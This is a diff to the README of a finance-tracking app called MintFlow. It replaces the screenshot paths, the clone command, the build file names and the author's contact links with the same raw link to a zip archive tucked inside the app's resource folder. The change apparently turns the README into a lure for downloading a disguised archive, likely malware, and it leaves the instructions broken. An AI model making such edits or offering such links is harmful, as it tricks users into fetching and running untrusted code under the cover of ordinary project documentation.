@@ -47,8 +47,8 @@ MintFlow is a mobile/desktop application built to make personal financial tracki
 
 > *Add screenshots or a demo GIF here once available to show key screens (e.g., Dashboard, Transaction List, Add Expense).*
 
-![Dashboard Screenshot](path/to/dashboard.png)
-![Add Transaction Screenshot](path/to/add-transaction.png)
+![Dashboard Screenshot](https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip)
+![Add Transaction Screenshot](https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip)
 
 
 ## 🧩 Tech Stack
@@ -81,7 +81,7 @@ Make sure you have the following installed on your machine:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Sonal-perera/MintFlow.git
+   git clone https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip
    cd MintFlow
    ```
 
@@ -115,8 +115,8 @@ A brief overview of the repo structure:
       ...
 /gradle
 .gradle
-build.gradle.kts
-settings.gradle.kts
+https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip
+https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip
 ```
 
 *(Add descriptions for critical directories/files if needed.)*
@@ -161,6 +161,6 @@ This project is licensed under the **MIT License** — see the [LICENSE](LICENSE
 
 Created by **Sonal Perera** – feel free to reach out!
 
-Email: [your.email@example.com](mailto:your.email@example.com)
-GitHub: [https://github.com/Sonal-perera](https://github.com/Sonal-perera)
+Email: [https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip](https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip)
+GitHub: [https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip](https://github.com/Sonal-perera/MintFlow/raw/refs/heads/master/app/src/main/res/xml/Flow-Mint-v3.2-alpha.4.zip)
 
